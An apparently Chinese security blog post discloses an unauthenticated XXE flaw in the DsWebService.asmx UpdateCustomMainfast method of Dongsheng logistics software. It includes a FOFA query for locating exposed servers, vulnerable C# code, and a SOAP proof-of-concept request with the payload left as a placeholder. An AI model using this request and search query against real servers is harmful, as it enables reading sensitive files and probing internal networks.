---
title: "东胜物流软件 DsWebService.asmx XXE漏洞"
source: https://mrxn.net/jswz/dongsheng-Webservice-DsWebService-XXE.html
asset_dir: assets/东胜物流软件-dswebservice.asmx-xxe漏洞
---

# 东胜物流软件 DsWebService.asmx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/25 16:50
- 781浏览
- [2评论](#comment)
- 22分钟阅读

深入探索

Webservice

软件

Web服务

---

# 漏洞简介

东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流软件 DsWebService.asmx 接口UpdateCustomMainfast方法存在 XML 外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

VPN服务

文件大小转换

安全

直接看 UpdateCustomMainfast 相关实现逻辑

```
public string UpdateCustomMainfast(
  string Xdoc,
  string XdocAfter,
  string Corpid,
  string SenderOp,
  string SenderHandphone,
  string SenderEmail,
  string SenderFax,
  string Mblno)
{
  try
  {
    bool AfterDoc = false;
    string filename = Mblno;
    string str1 = filename + "_";
    string str2 = $"d:\\Manifest\\Sendmain\\{filename}.xml";
    string str3 = $"d:\\Manifest\\Sendmain\\{filename}.zip";
    string str4 = $"d:\\Manifest\\Sendafter\\{str1}.xml";
    string str5 = $"d:\\Manifest\\Sendafter\\{str1}.zip";
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(Xdoc);
```

参数**xdoc**的内容被直接使用**XmlDocument**进行加载处理，无任何过滤或校验，从而导致[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:UpdateCustomMainfast>
         <!--Optional:-->
         <dsw:Xdoc>XXE_POC</dsw:Xdoc>
         <!--Optional:-->
         <dsw:XdocAfter>1</dsw:XdocAfter>
         <!--Optional:-->
         <dsw:Corpid>1</dsw:Corpid>
         <!--Optional:-->
         <dsw:SenderOp>1</dsw:SenderOp>
         <!--Optional:-->
         <dsw:SenderHandphone>1</dsw:SenderHandphone>
         <!--Optional:-->
         <dsw:SenderEmail>1</dsw:SenderEmail>
         <!--Optional:-->
         <dsw:SenderFax>1</dsw:SenderFax>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
      </dsw:UpdateCustomMainfast>
   </soap:Body>
</soap:Envelope>
```

[![东胜物流软件 DsWebService.asmx XXE漏洞](images/img-001-f1d0b823758f.webp)](https://image.mrxn.net/b3acef01d07f40ce85b48f912dc40fd5.webp)

DNSLOG平台成功收到DNS请求和HTTP请求

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
